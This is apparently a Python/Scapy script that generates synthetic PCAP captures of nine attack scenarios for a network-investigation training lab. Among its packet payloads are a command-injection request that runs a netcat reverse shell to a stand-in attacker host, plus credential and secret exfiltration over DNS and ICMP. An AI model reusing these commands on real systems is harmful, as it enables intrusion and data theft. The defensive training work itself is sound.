#!/usr/bin/env python3
"""
generate_level1_events.py - Generator for Level 1 Network Investigation Lab (10 Events)

Generates 10 distinct, forensically realistic PCAP capture files for Level 1:
- net01_web_redirect.pcap (Already built, reference)
- net02_dns_tunneling.pcap (Sensitive data exfiltrated via base64 in DNS queries)
- net03_ssh_bruteforce.pcap (High rate SYN packets against port 22 with auth attempts)
- net04_nmap_syn_scan.pcap (Stealth SYN scan across common server ports)
- net05_plaintext_creds.pcap (FTP / HTTP Basic auth cleartext password capture)
- net06_reverse_shell.pcap (Inbound HTTP web request triggering outbound connection to port 4444)
- net07_arp_spoofing.pcap (Gratuitous ARP replies mapping victim IP to attacker MAC)
- net08_icmp_exfil.pcap (Ping echo requests containing file data in payload)
- net09_tls_sni_inspection.pcap (HTTPS TLS Client Hello exposing malicious domain in SNI)
- net10_c2_beaconing.pcap (Periodic HTTP keepalive requests at steady 60s intervals)
"""

import os
import sys
import time
from scapy.all import (
    wrpcap, IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, DNSRR, Raw, Ether
)

def build_all(output_dir: str):
    os.makedirs(output_dir, exist_ok=True)
    
    client_ip = "192.168.1.105"
    client_mac = "00:0c:29:4f:8e:35"
    gateway_ip = "192.168.1.1"
    gateway_mac = "00:50:56:ea:bb:01"
    attacker_ip = "198.51.100.77"
    attacker_mac = "00:0c:29:bb:cc:dd"
    dns_server = "192.168.1.1"
    base_t = 1715000000.0

    # -------------------------------------------------------------
    # EVENT #02: DNS Tunneling Exfiltration
    # -------------------------------------------------------------
    pkts = []
    chunks = [
        "cGFzc3dvcmRzLnR4dA==", # "passwords.txt"
        "YWRtaW46U2VjcmV0MTIz", # "admin:Secret123"
        "ZmluYW5jZTpNYXN0ZXI5"  # "finance:Master9"
    ]
    t = base_t
    for idx, c in enumerate(chunks):
        qname = f"{c}.tunnel.exfil-threat-actor.org"
        req = Ether(src=client_mac, dst=gateway_mac) / \
              IP(src=client_ip, dst=dns_server) / \
              UDP(sport=54000+idx, dport=53) / \
              DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
        req.time = t
        pkts.append(req)
        
        resp = Ether(src=gateway_mac, dst=client_mac) / \
               IP(src=dns_server, dst=client_ip) / \
               UDP(sport=53, dport=54000+idx) / \
               DNS(qr=1, ra=1, qd=DNSQR(qname=qname, qtype="A"),
                   an=DNSRR(rrname=qname, type="A", ttl=10, rdata="198.51.100.99"))
        resp.time = t + 0.02
        pkts.append(resp)
        t += 0.5
    wrpcap(os.path.join(output_dir, "net02_dns_tunneling.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #03: SSH Password Brute-Force
    # -------------------------------------------------------------
    pkts = []
    t = base_t
    srv_ip = "192.168.1.200"
    for i in range(1, 15):
        sp = 40000 + i
        # Attacker SYN
        syn = Ether(src=gateway_mac, dst=client_mac) / \
              IP(src=attacker_ip, dst=srv_ip) / \
              TCP(sport=sp, dport=22, flags="S", seq=100*i, ack=0, window=1024)
        syn.time = t
        pkts.append(syn)
        
        # Server SYN-ACK
        sa = Ether(src=client_mac, dst=gateway_mac) / \
             IP(src=srv_ip, dst=attacker_ip) / \
             TCP(sport=22, dport=sp, flags="SA", seq=500*i, ack=100*i+1, window=65535)
        sa.time = t + 0.01
        pkts.append(sa)
        
        # Attacker sends banner / auth attempt payload
        p = Ether(src=gateway_mac, dst=client_mac) / \
            IP(src=attacker_ip, dst=srv_ip) / \
            TCP(sport=sp, dport=22, flags="PA", seq=100*i+1, ack=500*i+1, window=1024) / \
            Raw(load=f"SSH-2.0-OpenSSH_8.2p1 brute_pass_{i}\r\n".encode())
        p.time = t + 0.02
        pkts.append(p)
        
        # Server RST/FIN (Disconnect failed auth)
        rst = Ether(src=client_mac, dst=gateway_mac) / \
              IP(src=srv_ip, dst=attacker_ip) / \
              TCP(sport=22, dport=sp, flags="RA", seq=500*i+1, ack=100*i+30, window=0)
        rst.time = t + 0.03
        pkts.append(rst)
        t += 0.05
    wrpcap(os.path.join(output_dir, "net03_ssh_bruteforce.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #04: Nmap Stealth SYN Port Scan
    # -------------------------------------------------------------
    pkts = []
    t = base_t
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 8080]
    target_ip = "192.168.1.50"
    for idx, p in enumerate(ports):
        # Scan SYN
        syn = Ether(src=gateway_mac, dst=client_mac) / \
              IP(src=attacker_ip, dst=target_ip) / \
              TCP(sport=51234+idx, dport=p, flags="S", seq=1000+idx, ack=0, window=1024)
        syn.time = t
        pkts.append(syn)
        
        # If port 80 or 443 -> OPEN (SYN-ACK), else CLOSED (RST)
        if p in [80, 443]:
            resp = Ether(src=client_mac, dst=gateway_mac) / \
                   IP(src=target_ip, dst=attacker_ip) / \
                   TCP(sport=p, dport=51234+idx, flags="SA", seq=7000+idx, ack=1001+idx, window=65535)
            resp.time = t + 0.005
            pkts.append(resp)
            # Nmap sends RST to avoid full connection
            rst = Ether(src=gateway_mac, dst=client_mac) / \
                  IP(src=attacker_ip, dst=target_ip) / \
                  TCP(sport=51234+idx, dport=p, flags="R", seq=1001+idx, ack=0, window=0)
            rst.time = t + 0.006
            pkts.append(rst)
        else:
            resp = Ether(src=client_mac, dst=gateway_mac) / \
                   IP(src=target_ip, dst=attacker_ip) / \
                   TCP(sport=p, dport=51234+idx, flags="RA", seq=0, ack=1001+idx, window=0)
            resp.time = t + 0.005
            pkts.append(resp)
        t += 0.02
    wrpcap(os.path.join(output_dir, "net04_nmap_syn_scan.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #05: Plaintext Credentials (FTP Authentication)
    # -------------------------------------------------------------
    pkts = []
    t = base_t
    ftp_server = "192.168.1.15"
    cp = 49200
    # Handshake
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=ftp_server) / TCP(sport=cp, dport=21, flags="S", seq=10, ack=0))
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=ftp_server, dst=client_ip) / TCP(sport=21, dport=cp, flags="SA", seq=20, ack=11))
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=ftp_server) / TCP(sport=cp, dport=21, flags="A", seq=11, ack=21))
    
    # Server banner
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=ftp_server, dst=client_ip) / TCP(sport=21, dport=cp, flags="PA", seq=21, ack=11) / Raw(load=b"220 ProFTPD 1.3.5 Server\r\n"))
    # USER admin
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=ftp_server) / TCP(sport=cp, dport=21, flags="PA", seq=11, ack=47) / Raw(load=b"USER superadmin\r\n"))
    # 331 Password required
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=ftp_server, dst=client_ip) / TCP(sport=21, dport=cp, flags="PA", seq=47, ack=28) / Raw(load=b"331 Password required for superadmin\r\n"))
    # PASS Spring2024!#Secure
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=ftp_server) / TCP(sport=cp, dport=21, flags="PA", seq=28, ack=84) / Raw(load=b"PASS Spring2024!#Secure\r\n"))
    # 230 User logged in
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=ftp_server, dst=client_ip) / TCP(sport=21, dport=cp, flags="PA", seq=84, ack=53) / Raw(load=b"230 User superadmin logged in\r\n"))
    wrpcap(os.path.join(output_dir, "net05_plaintext_creds.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #06: Reverse Shell Connection
    # -------------------------------------------------------------
    pkts = []
    t = base_t
    web_server = "192.168.1.80"
    rev_c2 = "198.51.100.44"
    # Inbound exploit GET /cmd.php?c=bash
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=attacker_ip, dst=web_server) / TCP(sport=43210, dport=80, flags="PA", seq=1, ack=1) / Raw(load=b"GET /vuln.php?cmd=nc+198.51.100.44+4444+-e+/bin/sh HTTP/1.1\r\nHost: 192.168.1.80\r\n\r\n"))
    # Outbound TCP SYN from webserver:55000 to rev_c2:4444
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=web_server, dst=rev_c2) / TCP(sport=55000, dport=4444, flags="S", seq=100, ack=0))
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=rev_c2, dst=web_server) / TCP(sport=4444, dport=55000, flags="SA", seq=500, ack=101))
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=web_server, dst=rev_c2) / TCP(sport=55000, dport=4444, flags="A", seq=101, ack=501))
    # Interactive shell commands
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=rev_c2, dst=web_server) / TCP(sport=4444, dport=55000, flags="PA", seq=501, ack=101) / Raw(load=b"whoami; id; uname -a\n"))
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=web_server, dst=rev_c2) / TCP(sport=55000, dport=4444, flags="PA", seq=101, ack=523) / Raw(load=b"www-data\nuid=33(www-data) gid=33(www-data)\nLinux web01 5.4.0-generic\n"))
    wrpcap(os.path.join(output_dir, "net06_reverse_shell.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #07: ARP Spoofing / MITM
    # -------------------------------------------------------------
    pkts = []
    # Rogue ARP announcement claiming gateway IP belongs to attacker MAC
    for i in range(10):
        arp_poison = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / \
                     ARP(op=2, hwsrc=attacker_mac, psrc=gateway_ip, hwdst="00:00:00:00:00:00", pdst=gateway_ip)
        arp_poison.time = base_t + (i * 0.1)
        pkts.append(arp_poison)
    wrpcap(os.path.join(output_dir, "net07_arp_spoofing.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #08: ICMP Exfiltration
    # -------------------------------------------------------------
    pkts = []
    secret_data = [b"COMPANY_CONFIDENTIAL_KEY_PART1", b"_SECRET_DATABASE_ACCESS_TOKEN_", b"_PROD_API_KEY_9988776655443322"]
    for idx, d in enumerate(secret_data):
        icmp_pkt = Ether(src=client_mac, dst=gateway_mac) / \
                   IP(src=client_ip, dst=attacker_ip) / \
                   ICMP(type=8, id=100+idx, seq=idx) / \
                   Raw(load=d)
        icmp_pkt.time = base_t + idx
        pkts.append(icmp_pkt)
    wrpcap(os.path.join(output_dir, "net08_icmp_exfil.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #09: TLS SNI Malicious Domain Inspection
    # -------------------------------------------------------------
    pkts = []
    tls_c2_ip = "198.51.100.88"
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=tls_c2_ip) / TCP(sport=56100, dport=443, flags="S", seq=1, ack=0))
    pkts.append(Ether(src=gateway_mac, dst=client_mac) / IP(src=tls_c2_ip, dst=client_ip) / TCP(sport=443, dport=56100, flags="SA", seq=1, ack=2))
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=tls_c2_ip) / TCP(sport=56100, dport=443, flags="A", seq=2, ack=2))
    # Simulated TLS Client Hello containing SNI: malware-c2-rat-commander.ru
    client_hello_payload = b"\x16\x03\x01\x00\x90\x01\x00\x00\x8c\x03\x03" + b"\x00" * 32 + b"\x00\x00\x02\x00\xff\x01\x00\x00\x61\x00\x00\x00\x23\x00\x21\x00\x00\x1e" + b"malware-c2-rat-commander.ru"
    pkts.append(Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=tls_c2_ip) / TCP(sport=56100, dport=443, flags="PA", seq=2, ack=2) / Raw(load=client_hello_payload))
    wrpcap(os.path.join(output_dir, "net09_tls_sni_inspection.pcap"), pkts)

    # -------------------------------------------------------------
    # EVENT #10: C2 Periodic Beaconing Loop
    # -------------------------------------------------------------
    pkts = []
    t = base_t
    c2_server = "198.51.100.12"
    for i in range(5):
        # Every 60 seconds sharp
        req = Ether(src=client_mac, dst=gateway_mac) / IP(src=client_ip, dst=c2_server) / TCP(sport=57000+i, dport=80, flags="PA", seq=1, ack=1) / Raw(load=f"GET /heartbeat?agent_id=WKS-105&status=alive HTTP/1.1\r\nHost: c2-controller.net\r\n\r\n".encode())
        req.time = t
        pkts.append(req)
        
        resp = Ether(src=gateway_mac, dst=client_mac) / IP(src=c2_server, dst=client_ip) / TCP(sport=80, dport=57000+i, flags="PA", seq=1, ack=len(req[Raw].load)+1) / Raw(load=b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\nSLEEP")
        resp.time = t + 0.05
        pkts.append(resp)
        t += 60.0 # Strict 60-second jitterless interval
    wrpcap(os.path.join(output_dir, "net10_c2_beaconing.pcap"), pkts)

    print(f"[+] Successfully created all 10 Level 1 event PCAP captures in {output_dir}")

if __name__ == "__main__":
    out_dir = "/Users/zemark/CYBERSEC/tcpdump-incident-investigation-lab/captures"
    if len(sys.argv) > 1:
        out_dir = sys.argv[1]
    build_all(out_dir)
